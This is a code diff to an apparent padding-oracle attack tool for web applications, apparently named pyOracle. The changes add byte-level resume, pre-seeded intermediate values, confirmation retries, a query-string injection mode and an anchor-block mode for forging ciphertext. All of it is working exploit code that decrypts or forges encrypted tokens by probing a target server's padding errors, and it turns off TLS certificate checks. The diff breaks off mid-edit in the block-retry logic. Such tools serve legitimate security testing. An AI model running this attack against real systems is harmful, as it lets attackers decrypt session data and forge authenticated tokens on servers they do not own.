@@ -80,7 +80,9 @@ def saveState(job):
         currentBlockStr = "FINAL"
     else:
         currentBlockStr = str(job.currentBlock)
-    outputFileName = f"pyOracleState-{job.name}-BLOCK({currentBlockStr})-{str(int(ts))}.pkl"
+    bytes_done = len(job.block_solved_intermediates)
+    byte_suffix = f"-BYTE_{bytes_done}" if bytes_done > 0 and currentBlockStr != "FINAL" else ""
+    outputFileName = f"pyOracleState-{job.name}-BLOCK_{currentBlockStr}{byte_suffix}-{str(int(ts))}.pkl"
     pickleOut = open(outputFileName,"wb")
     pickle.dump(job,pickleOut)
     pickleOut.close()
@@ -109,7 +111,7 @@ def paddify(string,blocksize):
 # The job object holds the state for the encrypt/decrypt operation and contains the majority of the cryptographic code
 class Job:
     # set variables for the instance
-    def __init__(self,blocksize,mode,debug,sourceString,name,ivMode,URL,httpMethod,additionalParameters,httpProxyOn,httpProxyIp,httpProxyPort,headers,iv,oracleMode,oracleText,vulnerableParameter,inputMode,cookies,encodingMode,postFormat,followRedirects,concurrency=5,redirectDelay=0):
+    def __init__(self,blocksize,mode,debug,sourceString,name,ivMode,URL,httpMethod,additionalParameters,httpProxyOn,httpProxyIp,httpProxyPort,headers,iv,oracleMode,oracleText,vulnerableParameter,inputMode,cookies,encodingMode,postFormat,followRedirects,concurrency=5,redirectDelay=0,confirmations=0,plaintextEncoding='utf-8',anchorCiphertext=''):
 
         print('[*]Initializing job....')
         self.name = name
@@ -148,12 +150,25 @@ class Job:
         self.followRedirects = followRedirects
         self.concurrency = concurrency
         self.redirectDelay = redirectDelay
+        self.confirmations = confirmations
+        self.plaintextEncoding = plaintextEncoding
+        self.anchorCiphertext = anchorCiphertext
+
+        # Pre-seeded intermediate values from a previous partial run
+        # Dict of {byte_position: i_value}
+        self.preseeded_intermediates = {}
 
         # establish state on current completed block
         self.currentBlock = 0
 
         # establish initial state on solved blocks
         self.solvedBlocks = {}
+
+        # Byte-level progress within the current block (survives save/restore)
+        self.block_solved_intermediates = {}
+        self.block_solved_values = {}  # reals (decrypt) or crypto (encrypt)
+        self.block_currentbyte = None
+        self.block_padding_num = None
 
     def __getstate__(self):
         state = self.__dict__.copy()
@@ -165,6 +180,30 @@ class Job:
 
     def __setstate__(self, state):
         self.__dict__.update(state)
+        # Ensure byte-level progress fields exist for older pickles
+        if not hasattr(self, 'block_solved_intermediates'):
+            self.block_solved_intermediates = {}
+        if not hasattr(self, 'block_solved_values'):
+            self.block_solved_values = {}
+        if not hasattr(self, 'block_currentbyte'):
+            self.block_currentbyte = None
+        if not hasattr(self, 'block_padding_num'):
+            self.block_padding_num = None
+
+    def _clear_byte_progress(self):
+        """Clear byte-level progress after a block completes."""
+        self.block_solved_intermediates = {}
+        self.block_solved_values = {}
+        self.block_currentbyte = None
+        self.block_padding_num = None
+
+    def _save_byte_progress(self, solved_intermediates, solved_values, currentbyte, padding_num):
+        """Save byte-level progress to the job for mid-block persistence."""
+        self.block_solved_intermediates = solved_intermediates.copy()
+        self.block_solved_values = solved_values.copy()
+        self.block_currentbyte = currentbyte
+        self.block_padding_num = padding_num
+        saveState(self)
 
     def initialize_client(self):
         proxy = None
@@ -177,9 +216,13 @@ class Job:
         # follow-up request.  This is needed when the server stores state (e.g.
         # error messages in a session variable) that hasn't been committed by
         # the time the redirect target is loaded.
-        self.client = httpx.Client(proxy=proxy, verify=False, follow_redirects=False)
-        self.async_client = httpx.AsyncClient(proxy=proxy, verify=False, follow_redirects=False,
-                                               limits=httpx.Limits(max_connections=self.concurrency, max_keepalive_connections=self.concurrency))
+        timeout = httpx.Timeout(30.0, connect=10.0)
+        self.client = httpx.Client(proxy=proxy, verify=False, follow_redirects=False, timeout=timeout, http2=True)
+        # Pool needs headroom beyond concurrency so redirect follow-ups don't
+        # deadlock waiting for the connection from the initial request.
+        pool = self.concurrency * 2 + 2
+        self.async_client = httpx.AsyncClient(proxy=proxy, verify=False, follow_redirects=False, timeout=timeout, http2=True,
+                                               limits=httpx.Limits(max_connections=pool, max_keepalive_connections=pool))
         self._semaphore = None
 
     @property
@@ -188,43 +231,46 @@ class Job:
             self._semaphore = asyncio.Semaphore(self.concurrency)
         return self._semaphore
 
+    def encodeToken(self, raw_bytes):
+        """Encode raw ciphertext bytes into the wire format for the request."""
+        if self.encodingMode == 'base64':
+            b64 = bytes_to_base64(raw_bytes).decode()
+            # querystring mode: server expects literal +/= chars, no URL encoding
+            if self.inputMode == 'querystring':
+                return b64
+            return urllib.parse.quote_plus(b64)
+        elif self.encodingMode == 'base64Url':
+            return bytes_to_base64(raw_bytes).decode().replace('=','').replace("+","-").replace('/','_')
+        elif self.encodingMode == 'hex':
+            return raw_bytes.hex().upper()
+
     def oracleSanityCheck(self):
-        """Send a random ciphertext to verify the oracle text is detectable in the response."""
+        """Send a random ciphertext to verify the oracle text is detectable in the response.
+        Only runs in negative mode where we can confirm the error text appears for bad padding.
+        In search mode there's nothing to verify — the oracle text only appears on the rare valid hit."""
+
+        if self.oracleMode != 'negative':
+            print(f"[*] Oracle sanity check skipped (only applies to negative mode).")
+            return
+
         print("[*] Running oracle sanity check...")
 
         # Generate a random 2-block ciphertext that will almost certainly have invalid padding
         random_ct = os.urandom(self.blocksize * 2)
 
-        if self.encodingMode == 'base64':
-            test_token = urllib.parse.quote_plus(bytes_to_base64(random_ct))
-        elif self.encodingMode == 'base64Url':
-            test_token = bytes_to_base64(random_ct).decode().replace('=','').replace("+","-").replace('/','_')
-        elif self.encodingMode == 'hex':
-            test_token = random_ct.hex().upper()
+        test_token = self.encodeToken(random_ct)
 
         result = self.makeRequest(test_token)
         oracle_text = self.oracleText.lower()
         found = oracle_text in result.text.lower()
 
-        if self.oracleMode == 'negative':
-            # negative mode: oracleText should appear for bad padding, True (solved) when absent
-            if not found:
-                print(f"[!] WARNING: Oracle text '{self.oracleText}' was NOT found in the response to a random ciphertext.")
-                print(f"[!] In 'negative' mode, the text should appear when padding is INVALID.")
-                print(f"[!] Response preview: {result.text[:500]}")
-                handleError("[x] Oracle sanity check failed. Aborting.")
-            else:
-                print(f"[+] Oracle text found in response. Sanity check passed.")
-
-        elif self.oracleMode == 'search':
-            # search mode: oracleText should appear for valid padding, True (solved) when present
-            if found:
-                print(f"[!] WARNING: Oracle text '{self.oracleText}' was found in the response to a random ciphertext.")
-                print(f"[!] In 'search' mode, the text should only appear when padding is VALID.")
-                print(f"[!] Random ciphertext should almost never have valid padding.")
-                handleError("[x] Oracle sanity check failed. Aborting.")
-            else:
-                print(f"[+] Oracle text not found in random ciphertext response. Sanity check passed.")
+        if not found:
+            print(f"[!] WARNING: Oracle text '{self.oracleText}' was NOT found in the response to a random ciphertext.")
+            print(f"[!] In 'negative' mode, the text should appear when padding is INVALID.")
+            print(f"[!] Response preview: {result.text[:500]}")
+            handleError("[x] Oracle sanity check failed. Aborting.")
+        else:
+            print(f"[+] Oracle text found in response. Sanity check passed.")
 
     def initialize(self):
         self.initialize_client()
@@ -291,7 +337,7 @@ class Job:
         return response
 
     # make the HTTP request to the target to check current padding array against padding oracle
-    def makeRequest(self,encryptedstring):
+    def makeRequest(self,encryptedstring,progress=None):
 
         tempcookies = self.cookies.copy()
 
@@ -310,7 +356,11 @@ class Job:
 
                     urlBuilder = self.URL
 
-                    if self.inputMode == 'parameter':
+                    if self.inputMode == 'querystring':
+                        # ciphertext IS the entire query string (no parameter name)
+                        urlBuilder = urlBuilder + '?' + encryptedstring
+                        firstDelimiter = "&"
+                    elif self.inputMode == 'parameter':
                         # add the vulnerable parameter
                         urlBuilder = urlBuilder + '?' + self.vulnerableParameter + '=' + encryptedstring
 
@@ -336,24 +386,28 @@ class Job:
                     postData = self.additionalParameters.copy()
 
                     if self.inputMode == 'parameter':
-
                         # add the vulnerable parameter
                         postData[self.vulnerableParameter] = encryptedstring
 
+                    # for querystring mode, ciphertext goes in the URL, not the body
+                    postURL = self.URL
+                    if self.inputMode == 'querystring':
+                        postURL = self.URL + '?' + encryptedstring
+
                     if (self.postFormat == "form-urlencoded"):
                         self.headers["Content-Type"] = "application/x-www-form-urlencoded"
-                        r = self.client.post(self.URL,data=postData,headers=self.headers)
+                        r = self.client.post(postURL,data=postData,headers=self.headers)
 
                     elif (self.postFormat == "multipart"):
 
                         postData,multipartContentType = encode_multipart(postData)
                         self.headers['Content-Type'] = multipartContentType
-                        r = self.client.post(self.URL,data=postData,headers=self.headers)
+                        r = self.client.post(postURL,data=postData,headers=self.headers)
 
                     elif (self.postFormat == "json"):
 
                         self.headers["Content-Type"] = "application/json"
-                        r = self.client.post(self.URL,json=postData,headers=self.headers)
+                        r = self.client.post(postURL,json=postData,headers=self.headers)
 
                 # Manually follow redirects if enabled
                 if self.followRedirects:
@@ -364,10 +418,14 @@ class Job:
             except (httpx.ConnectError, httpx.TimeoutException, httpx.RemoteProtocolError) as e:
                 if attempt < max_retries - 1:
                     wait = 2 ** attempt
-                    print(f"[!] Network error: {e}. Retrying in {wait}s ({attempt + 1}/{max_retries})...")
+                    if progress is not None:
+                        progress[1] += 1
+                    else:
+                        print(f"[!] Network error: {e}. Retrying in {wait}s ({attempt + 1}/{max_retries})...")
                     time.sleep(wait)
                 else:
-                    print(f"[!] Network error after {max_retries} attempts: {e}")
+                    if progress is None:
+                        print(f"[!] Network error after {max_retries} attempts: {e}")
                     raise
 
     def _buildRequest(self, encryptedstring):
@@ -381,7 +439,10 @@ class Job:
 
         if self.httpMethod == "GET":
             urlBuilder = self.URL
-            if self.inputMode == 'parameter':
+            if self.inputMode == 'querystring':
+                urlBuilder = urlBuilder + '?' + encryptedstring
+                firstDelimiter = "&"
+            elif self.inputMode == 'parameter':
                 urlBuilder = urlBuilder + '?' + self.vulnerableParameter + '=' + encryptedstring
                 firstDelimiter = "&"
             else:
@@ -398,16 +459,19 @@ class Job:
             postData = self.additionalParameters.copy()
             if self.inputMode == 'parameter':
                 postData[self.vulnerableParameter] = encryptedstring
+            postURL = self.URL
+            if self.inputMode == 'querystring':
+                postURL = self.URL + '?' + encryptedstring
             if self.postFormat == "form-urlencoded":
                 headers["Content-Type"] = "application/x-www-form-urlencoded"
-                return ("POST", self.URL, {"data": postData, "headers": headers})
+                return ("POST", postURL, {"data": postData, "headers": headers})
             elif self.postFormat == "multipart":
                 postData,multipartContentType = encode_multipart(postData)
                 headers['Content-Type'] = multipartContentType
-                return ("POST", self.URL, {"data": postData, "headers": headers})
+                return ("POST", postURL, {"data": postData, "headers": headers})
             elif self.postFormat == "json":
                 headers["Content-Type"] = "application/json"
-                return ("POST", self.URL, {"json": postData, "headers": headers})
+                return ("POST", postURL, {"json": postData, "headers": headers})
 
     async def makeRequestAsync(self, encryptedstring, progress=None):
         """Async version of makeRequest using the async client."""
@@ -454,12 +518,7 @@ class Job:
             else:
                 tempTokenBytes = bytearray(self.fakeIV() + padding_array + block_data)
 
-            if self.encodingMode == 'base64':
-                tempToken = urllib.parse.quote_plus(bytes_to_base64(tempTokenBytes))
-            elif self.encodingMode == 'base64Url':
-                tempToken = bytes_to_base64(bytes(tempTokenBytes)).decode().replace('=','').replace("+","-").replace('/','_')
-            elif self.encodingMode == 'hex':
-                tempToken = tempTokenBytes.hex().upper()
+            tempToken = self.encodeToken(bytes(tempTokenBytes))
 
             result = await self.makeRequestAsync(tempToken, progress=progress)
 
@@ -481,6 +540,19 @@ class Job:
                 found_in_resp = oracle_text in result.text.lower()
                 print(f'\n      [DBG] count={count} status={result.status_code} len={len(result.text)} oracle_text_found={found_in_resp} oracle_pass={oracle_pass}')
             if oracle_pass:
+                # Confirm the result N times to rule out false positives
+                if self.confirmations > 0:
+                    for c in range(self.confirmations):
+                        if found_event.is_set():
+                            return None
+                        confirm_result = await self.makeRequestAsync(tempToken, progress=progress)
+                        confirm_pass = self.oracleCheck(confirm_result)
+                        if self.debug:
+                            print(f'\n      [DBG] confirm {c+1}/{self.confirmations} count={count} oracle_pass={confirm_pass}')
+                        if not confirm_pass:
+                            if self.debug:
+                                print(f'\n      [DBG] count={count} FAILED confirmation {c+1}/{self.confirmations} - false positive')
+                            return None
                 found_event.set()
                 return (count, result)
             return None
@@ -513,6 +585,73 @@ class Job:
 
         print(f'\r    Byte {currentbyte:2d}: FAILED - no valid padding found in 256 attempts          ')
         return None
+
+    def solveByteSync(self, currentbyte, padding_num, solved_intermediates, block_data, is_encrypt):
+        """Sequential version of solveByteAsync for concurrency=1. Uses sync makeRequest."""
+        padding_array_template = [0] * self.blocksize
+        progress = [0, 0]  # [tested_count, retry_count]
+
+        for count in range(256):
+            padding_array = padding_array_template[:]
+            padding_array[currentbyte] = count
+            for k, v in solved_intermediates.items():
+                padding_array[k] = v ^ padding_num
+
+            if is_encrypt:
+                tempTokenBytes = bytes(self.fakeIV() + padding_array + block_data)
+            else:
+                tempTokenBytes = bytearray(self.fakeIV() + padding_array + block_data)
+
+            tempToken = self.encodeToken(bytes(tempTokenBytes))
+
+            result = self.makeRequest(tempToken, progress=progress)
+
+            # Progress bar
+            progress[0] += 1
+            tested = progress[0]
+            retries = progress[1]
+            bar_len = 30
+            filled = int(bar_len * tested / 256)
+            bar = '█' * filled + '░' * (bar_len - filled)
+            retry_str = f' retries:{retries}' if retries > 0 else ''
+            print(f'\r    Byte {currentbyte:2d}: [{bar}] {tested:3d}/256{retry_str}', end='', flush=True)
+
+            oracle_pass = self.oracleCheck(result)
+            if self.debug:
+                oracle_text = self.oracleText.lower()
+                found_in_resp = oracle_text in result.text.lower()
+                print(f'\n      [DBG] count={count} status={result.status_code} len={len(result.text)} oracle_text_found={found_in_resp} oracle_pass={oracle_pass}')
+
+            if oracle_pass:
+                # Confirm N times to rule out false positives
+                if self.confirmations > 0:
+                    confirmed = True
+                    for c in range(self.confirmations):
+                        confirm_result = self.makeRequest(tempToken, progress=progress)
+                        confirm_pass = self.oracleCheck(confirm_result)
+                        if self.debug:
+                            print(f'\n      [DBG] confirm {c+1}/{self.confirmations} count={count} oracle_pass={confirm_pass}')
+                        if not confirm_pass:
+                            if self.debug:
+                                print(f'\n      [DBG] count={count} FAILED confirmation {c+1}/{self.confirmations} - false positive')
+                            confirmed = False
+                            break
+                    if not confirmed:
+                        continue
+
+                print(f'\r    Byte {currentbyte:2d}: [{"█" * 30}] FOUND at count={count} ({tested} tested, retries:{progress[1]})')
+
+                return (count, result)
+
+        print(f'\r    Byte {currentbyte:2d}: FAILED - no valid padding found in 256 attempts          ')
+        return None
+
+    async def solveByte(self, currentbyte, padding_num, solved_intermediates, block_data, is_encrypt):
+        """Dispatch to sync or async solver based on concurrency setting."""
+        if self.concurrency <= 1:
+            return self.solveByteSync(currentbyte, padding_num, solved_intermediates, block_data, is_encrypt)
+        else:
+            return await self.solveByteAsync(currentbyte, padding_num, solved_intermediates, block_data, is_encrypt)
 
     def fakeIV(self):
         return [0] * self.blocksize
@@ -551,21 +690,69 @@ class Job:
         raise Exception("Block failed to decrypt/encrypt, likely a random network error.")
         #sys.exit(2)
 
+    def _verifyIntermediate(self, byte_pos, i_val, padding_num, solved_intermediates, block_data, is_encrypt):
+        """Re-verify a pre-seeded intermediate value by reconstructing the request and checking the oracle."""
+        count = i_val ^ padding_num
+        padding_array = [0] * self.blocksize
+        padding_array[byte_pos] = count
+        for k, v in solved_intermediates.items():
+            padding_array[k] = v ^ padding_num
+
+        if is_encrypt:
+            tempTokenBytes = bytes(self.fakeIV() + padding_array + block_data)
+        else:
+            tempTokenBytes = bytearray(self.fakeIV() + padding_array + block_data)
+
+        tempToken = self.encodeToken(bytes(tempTokenBytes))
+
+        result = self.makeRequest(tempToken)
+        return self.oracleCheck(result)
+
     async def encryptBlock(self):
         print(f'[!]Starting Analysis for block number: {self.currentBlock + 1} OF {self.blockCount}\n')
-        solved_intermediates = {}
-        solved_crypto = {}
-        padding_num = 1
-        currentbyte = self.blocksize - 1
+
+        # Resume from saved byte-level progress if available
+        if self.block_currentbyte is not None and self.block_solved_intermediates:
+            solved_intermediates = self.block_solved_intermediates.copy()
+            solved_crypto = self.block_solved_values.copy()
+            currentbyte = self.block_currentbyte
+            padding_num = self.block_padding_num
+            bytes_done = self.blocksize - 1 - currentbyte
+            print(f'[+] Resuming block from byte {currentbyte} ({bytes_done}/{self.blocksize} bytes already solved)')
+        else:
+            solved_intermediates = {}
+            solved_crypto = {}
+            padding_num = 1
+            currentbyte = self.blocksize - 1
 
         if self.currentBlock == 0:
-             previousBlock = [0] * self.blocksize
+            if self.ivMode == "knownIV":
+                previousBlock = list(self.iv)
+            else:
+                previousBlock = [0] * self.blocksize
         else:
             previousBlock = list(bytearray(self.solvedBlocks[self.currentBlock - 1]))
 
-        for n in range(0,self.blocksize):
+        while currentbyte >= 0:
 
-            result = await self.solveByteAsync(currentbyte, padding_num, solved_intermediates, previousBlock, is_encrypt=True)
+            # Check if we have a pre-seeded value for this byte (only on first block)
+            if currentbyte in self.preseeded_intermediates:
+                currenti = self.preseeded_intermediates[currentbyte]
+                print(f'[*] Verifying pre-seeded I value {currenti} for byte {currentbyte}...')
+                if self._verifyIntermediate(currentbyte, currenti, padding_num, solved_intermediates, previousBlock, is_encrypt=True):
+                    print(f'[+] Verified! Skipping byte {currentbyte}')
+                    solved_intermediates[currentbyte] = currenti
+                    currentcrypto = (self.blocks[self.currentBlock][currentbyte]) ^ currenti
+                    print(f'[+]crypto value of this char in the next (previous) block is: {str(currentcrypto)}\n')
+                    solved_crypto[currentbyte] = currentcrypto
+                    padding_num += 1
+                    currentbyte -= 1
+                    self._save_byte_progress(solved_intermediates, solved_crypto, currentbyte, padding_num)
+                    continue
+                else:
+                    print(f'[!] Pre-seeded value FAILED verification. Re-solving byte {currentbyte}...')
+
+            result = await self.solveByte(currentbyte, padding_num, solved_intermediates, previousBlock, is_encrypt=True)
 
             if result is None:
                 self.encryptBlockFail([0]*self.blocksize, b'')
@@ -583,6 +770,9 @@ class Job:
             padding_num = padding_num + 1
             currentbyte = currentbyte - 1
 
+            # Save byte-level progress after each solved byte
+            self._save_byte_progress(solved_intermediates, solved_crypto, currentbyte, padding_num)
+
         blockresult = bytes(reversed(list(solved_crypto.values())))
         print('\n*************************************************')
         print('[*]BLOCK SOLVED:')
@@ -593,10 +783,21 @@ class Job:
 
     async def decryptBlock(self):
         print(f"[!]Starting Analysis for block number: {self.currentBlock} OF {self.blockCount}\n")
-        solved_intermediates = {}
-        solved_reals = {}
-        padding_num = 1
-        currentbyte = self.blocksize - 1
+
+        # Resume from saved byte-level progress if available
+        if self.block_currentbyte is not None and self.block_solved_intermediates:
+            solved_intermediates = self.block_solved_intermediates.copy()
+            solved_reals = self.block_solved_values.copy()
+            currentbyte = self.block_currentbyte
+            padding_num = self.block_padding_num
+            bytes_done = self.blocksize - 1 - currentbyte
+            print(f'[+] Resuming block from byte {currentbyte} ({bytes_done}/{self.blocksize} bytes already solved)')
+        else:
+            solved_intermediates = {}
+            solved_reals = {}
+            padding_num = 1
+            currentbyte = self.blocksize - 1
+
         # if we are on the first block use the IV as the 'previousBlock'
         if self.currentBlock == 0:
             if self.ivMode == "firstblock" or self.ivMode == "knownIV":
@@ -606,10 +807,27 @@ class Job:
         else:
             previousBlock = self.blocks[self.currentBlock - 1]
 
-        for n in range(0,self.blocksize):
+        while currentbyte >= 0:
             tempblock = self.blocks[self.currentBlock][:]
 
-            result = await self.solveByteAsync(currentbyte, padding_num, solved_intermediates, tempblock, is_encrypt=False)
+            # Check if we have a pre-seeded value for this byte (only on first block)
+            if currentbyte in self.preseeded_intermediates:
+                currenti = self.preseeded_intermediates[currentbyte]
+                print(f'[*] Verifying pre-seeded I value {currenti} for byte {currentbyte}...')
+                if self._verifyIntermediate(currentbyte, currenti, padding_num, solved_intermediates, tempblock, is_encrypt=False):
+                    print(f'[+] Verified! Skipping byte {currentbyte}')
+                    solved_intermediates[currentbyte] = currenti
+                    currentreal = (previousBlock[currentbyte]) ^ currenti
+                    print(f'[+]real value of last char is: {str(currentreal)}\n')
+                    solved_reals[currentbyte] = currentreal
+                    padding_num += 1
+                    currentbyte -= 1
+                    self._save_byte_progress(solved_intermediates, solved_reals, currentbyte, padding_num)
+                    continue
+                else:
+                    print(f'[!] Pre-seeded value FAILED verification. Re-solving byte {currentbyte}...')
+
+            result = await self.solveByte(currentbyte, padding_num, solved_intermediates, tempblock, is_encrypt=False)
 
             if result is None:
                 self.decryptBlockFail([0]*self.blocksize, b'')
@@ -626,13 +844,16 @@ class Job:
             padding_num = padding_num + 1
             currentbyte = currentbyte - 1
 
+            # Save byte-level progress after each solved byte
+            self._save_byte_progress(solved_intermediates, solved_reals, currentbyte, padding_num)
+
         blockresult = bytes(reversed(list(solved_reals.values())))
 
         try:
             blockresultString = blockresult.decode()
         except:
             blockresultString = blockresult.decode('latin1')
-            print("Failed sanity check, but bypassing for now")
+            print("[*] Block contains non-UTF-8 bytes, using latin1 decoding")
         writeToLog(f'[!]BLOCK SOLVED: {blockresult}')
         print(f'[!]BLOCK SOLVED: {blockresult}')
         return blockresult
@@ -663,18 +884,14 @@ class Job:
             # combine all of the blocks into one decimal list
             joinedCrypto = b''.join(reversed(list(self.solvedBlocks.values())))
 
-            # add in the "first" (last) block of all 0's
-            joinedCrypto = b''.join([joinedCrypto,bytes([0] * self.blocksize)])
+            # Append the anchor block that was used as previousBlock for block 0.
+            if self.ivMode in ("knownIV", "anchorBlock"):
+                joinedCrypto = b''.join([joinedCrypto, bytes(self.iv)])
+            else:
+                joinedCrypto = b''.join([joinedCrypto, bytes([0] * self.blocksize)])
 
-            if self.encodingMode == 'base64':
-                encryptTemp = b64urlEncode(urllib.parse.quote_plus(bytes_to_base64(joinedCrypto)))
-
-            if self.encodingMode == "base64Url":
-                encryptTemp = bytes_to_base64(joinedCrypto).decode().replace('=','').replace("+","-").replace('/','_')
-
-            if self.encodingMode == 'hex':
-                encryptTemp = joinedCrypto.hex().upper()
-            oracleCheckResult = self.makeRequest(encryptTemp) #make the request with the messed with encryptedstring
+            encryptTemp = self.encodeToken(joinedCrypto)
+            oracleCheckResult = self.makeRequest(encryptTemp)
 
             #if the oracleCheck failed... (not solved)
             if not self.oracleCheck(oracleCheckResult):
@@ -762,26 +979,54 @@ class Job:
 
     def encryptInit(self):
 
-        # set the text to encrypt and paddify it
-        self.encryptText = paddify(self.sourceString,self.blocksize)
         print(f"[+]Raw encrypt string: {self.sourceString}")
-        print(f"[+]Padded encrypt string: {self.encryptText}")
+        print(f"[+]Plaintext encoding: {self.plaintextEncoding}")
 
-        # the mode is knownIV or unknownIV, we cant encrypt the first block. It should be possible to encrypt all other blocks, but we will add this later.
-        if not self.ivMode == "firstblock":
-            print("[!]Support for encrypting with knownIV or unknownIV mode is not currently in place")
+        # unknown IV mode can't produce a clean first block
+        if self.ivMode == "unknown":
+            print("[!]Encrypt with unknown IV is not supported. Use knownIV, firstblock, or anchorBlock mode.")
             sys.exit(2)
 
-        # Save the bytemap to the object in case operation is interupted
-        bytemap = str.encode(self.encryptText)
-        self.bytemap = bytemap
+        if self.ivMode == "anchorBlock":
+            # Extract the first block from the provided anchorCiphertext to use as the IV/anchor
+            anchor_ct = self.anchorCiphertext
+            unquoted = urllib.parse.unquote(anchor_ct)
+            if (self.encodingMode == 'base64') or (self.encodingMode == 'base64Url'):
+                unquoted += '=' * (len(unquoted) % 4)
+            if self.encodingMode == 'base64Url':
+                unquoted = unquoted.replace('-','+').replace('_','/')
+            if (self.encodingMode == 'base64') or (self.encodingMode == 'base64Url'):
+                anchor_bytes = list(binascii.a2b_base64(unquoted))
+            elif self.encodingMode == 'hex':
+                anchor_bytes = list(bytes.fromhex(unquoted))
+            self.iv = anchor_bytes[0:self.blocksize]
+            print(f"[+]Anchor block extracted from ciphertext: {bytes(self.iv).hex()}")
+            print(f"[+]Your plaintext will be encrypted into blocks following this anchor.")
 
-         # initialize the blocks array
+        if self.ivMode == "knownIV":
+            print(f"[+]Using known IV: {self.iv}")
+            print(f"[!]Note: First decrypted block will be uncontrolled (server runs AES_DEC on C_0 with static IV).")
+            print(f"[+]IV will be appended as anchor block. Your plaintext starts at block 1.")
+
+        # Encode the plaintext string to bytes using the configured encoding
+        raw_bytes = self.sourceString.encode(self.plaintextEncoding)
+        print(f"[+]Encoded bytes ({len(raw_bytes)}): {raw_bytes.hex()}")
+
+        # Apply PKCS#7 padding at the byte level
+        padding_length = self.blocksize - (len(raw_bytes) % self.blocksize)
+        if padding_length == 0:
+            padding_length = self.blocksize
+        padded_bytes = raw_bytes + bytes([padding_length] * padding_length)
+        print(f"[+]Padded bytes ({len(padded_bytes)}), padding={padding_length}: {padded_bytes.hex()}")
+
+        # Save the bytemap to the object in case operation is interrupted
+        self.bytemap = padded_bytes
+
+        # initialize the blocks array
         self.blocks = []
 
         # we have to recreate the byte array, not just reference it
         actualBlocks = self.bytemap[:]
-        # print(actualBlocks)
 
         #Get the block count and save it to the instance
         self.blockCount = int((len(self.bytemap) / self.blocksize))
@@ -807,14 +1052,15 @@ async def async_main():
     parser.add_argument("-m", "--mode", type=str,help="Select encrypt or decrypt mode")
     parser.add_argument("-d", "--debug", action="store_true", help="increase output verbosity")
     parser.add_argument("-c", "--config", type=str, help="Specify the configuration file")
+    parser.add_argument("-s", "--intermediates", type=str, help="Pre-seed solved intermediate values from a previous run. Format: \"15:210,14:216\"")
     args = parser.parse_args()
 
 
     # check to see if we are performing a restore operation
     if args.restore:
-        # if we are doing a restore, no other flags should be set
+        # if we are doing a restore, only -s (intermediates) is allowed alongside
         if (args.input or args.mode or args.debug):
-            handleError("\n[x] In restore mode no other options should be set! Exiting.")
+            handleError("\n[x] In restore mode, only -s (intermediates) may be combined. Exiting.")
 
     # make sure that required parameters are present and validated
     else:
@@ -838,6 +1084,13 @@ async def async_main():
         pickleFile.close()
         # Recreate the httpx client since it can't be pickled
         job.initialize_client()
+        if not hasattr(job, 'preseeded_intermediates'):
+            job.preseeded_intermediates = {}
+        if args.intermediates:
+            for pair in args.intermediates.split(','):
+                byte_pos, i_val = pair.strip().split(':')
+                job.preseeded_intermediates[int(byte_pos)] = int(i_val)
+            print(f"[+] Pre-seeded {len(job.preseeded_intermediates)} intermediate values: {job.preseeded_intermediates}")
         print(job.name)
         print(job.solvedBlocks)
         print(job.currentBlock)
@@ -878,6 +1131,8 @@ async def async_main():
         followRedirects = config['default'].getboolean('followRedirects')
         concurrency = int(config['default'].get('concurrency', '10'))
         redirectDelay = float(config['default'].get('redirectDelay', '0'))
+        confirmations = int(config['default'].get('confirmations', '0'))
+        plaintextEncoding = config['default'].get('plaintextEncoding', 'utf-8')
         # config value validation
         # validate oracleMode
         if not oracleMode:
@@ -945,9 +1200,9 @@ async def async_main():
         if not ivMode:
             handleError("[x]CONFIG ERROR: ivMode is required.")
         else:
-            if not ((ivMode == 'firstblock') or (ivMode == 'knownIV') or (ivMode == 'unknown')):
+            if ivMode not in ('firstblock', 'knownIV', 'unknown', 'anchorBlock'):
                 print(f"[x]CONFIG ERROR: iVMode: '{ivMode}' invalid.")
-                handleError("[!]Valid ivMode values: firstblock, knownIV, or unknown")
+                handleError("[!]Valid ivMode values: firstblock, knownIV, unknown, or anchorBlock")
 
         # validate iv
 
@@ -962,20 +1217,40 @@ async def async_main():
             if not (all(isinstance(x, int) for x in iv)):
                 handleError("[x]CONFIG ERROR: IV is not properly formatted. Not all values are type INT")
 
+        # anchorBlock mode requires anchorCiphertext
+        anchorCiphertext = config['default'].get('anchorCiphertext', '')
+        if ivMode == 'anchorBlock':
+            if not anchorCiphertext:
+                handleError("[x]CONFIG ERROR: anchorCiphertext is required when ivMode is anchorBlock")
 
         # Initialize Job object
-        job = Job(blocksize,args.mode,args.debug,args.input,name,ivMode,URL,httpMethod,additionalParameters,httpProxyOn,httpProxyIp,httpProxyPort,headers,iv,oracleMode,oracleText,vulnerableParameter,inputMode,cookies,encodingMode,postFormat,followRedirects,concurrency,redirectDelay)
+        job = Job(blocksize,args.mode,args.debug,args.input,name,ivMode,URL,httpMethod,additionalParameters,httpProxyOn,httpProxyIp,httpProxyPort,headers,iv,oracleMode,oracleText,vulnerableParameter,inputMode,cookies,encodingMode,postFormat,followRedirects,concurrency,redirectDelay,confirmations,plaintextEncoding,anchorCiphertext)
         job.initialize()
 
-    print(f'Starting job in {job.mode} mode. Attempting to {job.mode} the following string: {args.input}')
-    writeToLog(f'Starting job in {job.mode} mode. Attempting to {job.mode} the following string: {args.input}')
+        # Parse and set pre-seeded intermediates if provided
+        if args.intermediates:
+            for pair in args.intermediates.split(','):
+                byte_pos, i_val = pair.strip().split(':')
+                job.preseeded_intermediates[int(byte_pos)] = int(i_val)
+            print(f"[+] Pre-seeded {len(job.preseeded_intermediates)} intermediate values: {job.preseeded_intermediates}")
 
+    input_display = args.input if args.input else job.sourceString
+    print(f'Starting job in {job.mode} mode. Attempting to {job.mode} the following string: {input_display}')
+    writeToLog(f'Starting job in {job.mode} mode. Attempting to {job.mode} the following string: {input_display}')
+
+    max_block_retries = 3
+    block_failures = 0
     while job.currentBlock < (job.blockCount):
         result = await job.nextBlock()
         if result == 0:
+            block_failures = 0
 
             #Since the block was sucessful, roll to the next one
             job.currentBlock = job.currentBlock + 1
+
+            # Clear byte-level progress and pre-seeded intermediates since they're block-specific
+            job._clear_byte_progress()
+            job.preseeded_intermediates = {}
 
             #Save the current state so that it can be resumed later
             saveState(job)
@@ -984,7 +1259,16 @@ async def async_main():
             job.printProgress()
 
         else:
-            print(f"[!]Something went wrong with block {job.currentBlock}. Will repeat block")
+            block_failures += 1
+            if block_failures >= max_block_retries:
+                print(f"[x] Block {job.currentBlock} failed {max_block_retries} times in a row. Aborting.")
+                print(f"[!] Check your session cookies / authentication and try again.")
+                saveState(job)
+                sys.exit(1)
+            # Keep byte-level progress so the retry resumes where it left off
